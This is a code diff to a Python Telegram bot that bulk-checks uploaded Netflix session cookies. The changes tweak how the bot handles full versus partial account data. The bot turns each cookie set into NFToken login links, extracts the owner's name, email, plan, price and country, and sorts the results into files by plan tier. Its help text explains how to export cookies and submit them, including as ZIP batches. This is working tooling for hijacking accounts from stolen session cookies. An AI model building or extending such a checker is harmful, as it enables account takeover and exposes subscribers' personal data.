@@ -114,7 +114,7 @@ performance:
   nftoken_for_free: false
 """
 
-APP_VERSION = "4.6.0"
+APP_VERSION = "4.6.1"
 
 # Folders
 cookies_folder = "cookies"
@@ -781,6 +781,21 @@ def get_name_from_profiles(info):
             return clean_names[0]
     return "Unknown"
 
+def has_any_account_info(info):
+    if not info:
+        return False
+    important_fields = ["countryOfSignup", "membershipStatus", "localizedPlanName", "accountOwnerName", "email"]
+    return any(info.get(f) for f in important_fields)
+
+def is_complete_account_info(info):
+    """التحقق مما إذا كانت البيانات كاملة أم ناقصة"""
+    if not info:
+        return False
+    # نعتبرها كاملة إذا وجدنا على الأقل 3 من هذه الحقول المهمة
+    important_fields = ['accountOwnerName', 'localizedPlanName', 'maxStreams', 'planPrice', 'email']
+    found_fields = sum(1 for f in important_fields if info.get(f))
+    return found_fields >= 3
+
 
 # ==================== RESULT FORMATTING ====================
 
@@ -960,7 +975,7 @@ async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 📌 WHAT I DO:
 
    ✅ Verify Netflix cookies
-   ✅ Extract FULL premium account details (NEW!)
+   ✅ Extract FULL premium account details
    ✅ Generate NFToken login links
 
 ⚙️ HOW TO USE:
@@ -975,7 +990,7 @@ async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    /help   → Instructions
    /stats  → Statistics
    /tokenonly  → Token-only mode
-   /fullinfo   → Full details mode (RECOMMENDED)
+   /fullinfo   → Full details mode
    /cancel     → Stop current task
 """)
 
@@ -986,7 +1001,6 @@ async def bot_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
 STEP 1: Export Cookies
    - EditThisCookie (Chrome)
    - Cookie-Editor (Firefox)
-   - Get cookies.txt
    - Export as JSON for best results
 
 STEP 2: Send Files
@@ -994,21 +1008,13 @@ STEP 2: Send Files
    - OR send ZIP with multiple files
 
 STEP 3: Get Complete Results
-   - PREMIUM_ACCOUNTS.txt (Full details: name, plan, price, profiles)
+   - PREMIUM_ACCOUNTS.txt (Full details)
    - STANDARD_ACCOUNTS.txt
    - BASIC_ACCOUNTS.txt
    - FREE_ACCOUNTS.txt
-   - PARTIAL_DATA.txt
+   - PARTIAL_DATA.txt (Only for incomplete data)
 
-💡 NEW: Now extracts ALL account data via NFToken API
-   - Account owner name
-   - Plan details & price
-   - Profile names
-   - Payment method
-   - Phone number
-   - And more!
-
-🔽 USE THE MENU BUTTON FOR COMMANDS
+💡 Now extracts ALL account data via NFToken API
 """)
 
 async def bot_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1022,7 +1028,7 @@ Total files processed: {stats['total']}
 🔄 Currently processing: {stats['processing']}
 
 🤖 Bot is running normally
-🆕 Version: {APP_VERSION} (Full API Mode)
+🆕 Version: {APP_VERSION}
 """)
 
 async def bot_tokenonly(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1062,60 +1068,54 @@ async def process_single_bundle(update: Update, context: ContextTypes.DEFAULT_TY
     nftoken_data, nftoken_err = create_nftoken(cookies, 1)
     
     if not nftoken_data or not has_usable_nftoken(nftoken_data):
-        # فشل في إنشاء الـ Token
         return None, None, f"NFToken failed: {nftoken_err}"
     
-    # استخدام الـ API الجديد لجلب البيانات الكاملة (الحل رقم 2)
+    # استخدام الـ API الجديد لجلب البيانات الكاملة
     if mode == 'fullinfo':
         await status_msg.edit_text(f"🔄 [{index}/{total}] Fetching account data via API...")
         account_info = get_full_account_via_nftoken_api(cookies, nftoken_data['token'])
         
         if account_info and has_any_account_info(account_info):
             is_sub = is_subscribed_account(account_info)
-            result_lines, plan_key = format_result_beautiful(account_info, is_sub, bundle.get("netscape_text", ""), cookie_filename, nftoken_data, config)
-            result = "\n".join(result_lines)
-            return result, plan_key, "success" if is_sub else "free"
+            
+            # التحقق: هل البيانات كاملة أم ناقصة؟
+            if is_complete_account_info(account_info):
+                result_lines, plan_key = format_result_beautiful(account_info, is_sub, bundle.get("netscape_text", ""), cookie_filename, nftoken_data, config)
+                result = "\n".join(result_lines)
+                return result, plan_key, "success" if is_sub else "free"
+            else:
+                # بيانات ناقصة - نرسلها كـ partial مع رابط الـ NFToken
+                email = account_info.get("email", "Unknown")
+                partial_result = f"""⚠️ Partial Data - {cookie_filename}
+
+Email: {email}
+Status: {'Active' if is_sub else 'Free/Inactive'}
+Country: {account_info.get('countryOfSignup', 'Unknown')}
+Plan: {account_info.get('localizedPlanName', 'Unknown')}
+
+NFToken Login Link:
+https://netflix.com/?nftoken={nftoken_data['token']}
+
+ℹ️ Open the link to see full account details
+"""
+                return partial_result, None, "partial"
     
-    # وضع tokenonly أو فشل الـ API
-    # نحاول نستخرج على الأقل الإيميل من الـ API لو موجود
-    fallback_info = {}
+    # وضع tokenonly
+    email = "Unknown"
     try:
         test_info = get_full_account_via_nftoken_api(cookies, nftoken_data['token'])
-        if test_info:
-            fallback_info = test_info
+        if test_info and test_info.get('email'):
+            email = test_info.get('email')
     except:
         pass
     
-    email = fallback_info.get("email", "Unknown")
-    
-    if mode == 'tokenonly':
-        result = f"Account: {email}\n\nNFToken Login Links:\n---\n"
-        mode_set = get_nftoken_mode(config)
-        for label, link in build_nftoken_links(nftoken_data["token"], mode_set):
-            result += f"\n{label}:\n\n{link}\n"
-        if nftoken_data.get("expires_at_utc"):
-            result += f"\nValid Until: {nftoken_data['expires_at_utc']}"
-        return result, None, "success"
-    else:
-        # API فشل نعطيه البيانات اللي عندنا
-        result = f"""⚠️ Partial Data - {cookie_filename}
-
-Email: {email}
-
-NFToken Login Links:
-"""
-        mode_set = get_nftoken_mode(config)
-        for label, link in build_nftoken_links(nftoken_data["token"], mode_set):
-            result += f"\n{label}: {link}\n"
-        result += "\nℹ️ Open the link to see full account details"
-        return result, None, "partial"
-
-
-def has_any_account_info(info):
-    if not info:
-        return False
-    important_fields = ["countryOfSignup", "membershipStatus", "localizedPlanName", "accountOwnerName", "email"]
-    return any(info.get(f) for f in important_fields)
+    result = f"Account: {email}\n\nNFToken Login Links:\n---\n"
+    mode_set = get_nftoken_mode(config)
+    for label, link in build_nftoken_links(nftoken_data["token"], mode_set):
+        result += f"\n{label}:\n\n{link}\n"
+    if nftoken_data.get("expires_at_utc"):
+        result += f"\nValid Until: {nftoken_data['expires_at_utc']}"
+    return result, None, "success"
 
 
 # ==================== SINGLE FILE HANDLER ====================
@@ -1197,13 +1197,14 @@ async def handle_single_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
                 results_by_plan[plan_key].append(result)
                 results_by_plan[plan_key].append("\n" + "="*65 + "\n")
                 stats['valid'] += 1
-            elif result_type == "free":
-                results_by_plan["free"].append(result)
-                results_by_plan["free"].append("\n" + "="*65 + "\n")
+            elif result_type == "free" and plan_key:
+                results_by_plan[plan_key].append(result)
+                results_by_plan[plan_key].append("\n" + "="*65 + "\n")
                 stats['free'] += 1
             elif result_type == "partial":
                 results_by_plan["partial"].append(result)
                 results_by_plan["partial"].append("\n" + "="*65 + "\n")
+                stats['free'] += 1
         else:
             invalid_count += 1
             stats['failed'] += 1
@@ -1328,21 +1329,48 @@ async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                 
                                 if account_info and has_any_account_info(account_info):
                                     is_sub = is_subscribed_account(account_info)
-                                    result_lines, plan_key = format_result_beautiful(account_info, is_sub, bundle.get("netscape_text", ""), cf, nftoken_data, config)
-                                    res = "\n".join(result_lines)
                                     
-                                    if plan_key in results_by_plan:
-                                        results_by_plan[plan_key].append(res)
-                                        results_by_plan[plan_key].append("\n" + "="*65 + "\n")
-                                        stats['valid'] += 1
+                                    # التحقق من اكتمال البيانات
+                                    if is_complete_account_info(account_info):
+                                        result_lines, plan_key = format_result_beautiful(account_info, is_sub, bundle.get("netscape_text", ""), cf, nftoken_data, config)
+                                        res = "\n".join(result_lines)
+                                        
+                                        if plan_key in results_by_plan:
+                                            results_by_plan[plan_key].append(res)
+                                            results_by_plan[plan_key].append("\n" + "="*65 + "\n")
+                                        else:
+                                            results_by_plan["premium"].append(res)
+                                            results_by_plan["premium"].append("\n" + "="*65 + "\n")
+                                        
+                                        if is_sub:
+                                            stats['valid'] += 1
+                                        else:
+                                            stats['free'] += 1
                                     else:
-                                        results_by_plan["premium"].append(res)
-                                        results_by_plan["premium"].append("\n" + "="*65 + "\n")
-                                        stats['valid'] += 1
+                                        # بيانات ناقصة - تذهب لـ PARTIAL_DATA
+                                        email = account_info.get("email", "Unknown")
+                                        partial_res = f"""⚠️ Partial Data - {cf}
+
+Email: {email}
+Status: {'Active' if is_sub else 'Free/Inactive'}
+Country: {account_info.get('countryOfSignup', 'Unknown')}
+Plan: {account_info.get('localizedPlanName', 'Unknown')}
+
+NFToken Login Link:
+https://netflix.com/?nftoken={nftoken_data['token']}
+
+ℹ️ Open the link to see full account details
+"""
+                                        results_by_plan["partial"].append(partial_res)
+                                        results_by_plan["partial"].append("\n" + "="*65 + "\n")
+                                        if is_sub:
+                                            stats['valid'] += 1
+                                        else:
+                                            stats['free'] += 1
                                 else:
-                                    # Partial data
-                                    email = account_info.get("email", "Unknown") if account_info else "Unknown"
-                                    partial_res = f"⚠️ Partial Data - {cf}\nEmail: {email}\nNFToken: https://netflix.com/?nftoken={nftoken_data['token']}\n"
+                                    # فشل في جلب البيانات - نعطي رابط فقط
+                                    email = "Unknown"
+                                    partial_res = f"⚠️ Limited Data - {cf}\nNFToken: https://netflix.com/?nftoken={nftoken_data['token']}\n"
                                     results_by_plan["partial"].append(partial_res)
                                     results_by_plan["partial"].append("\n" + "="*65 + "\n")
                                     stats['free'] += 1
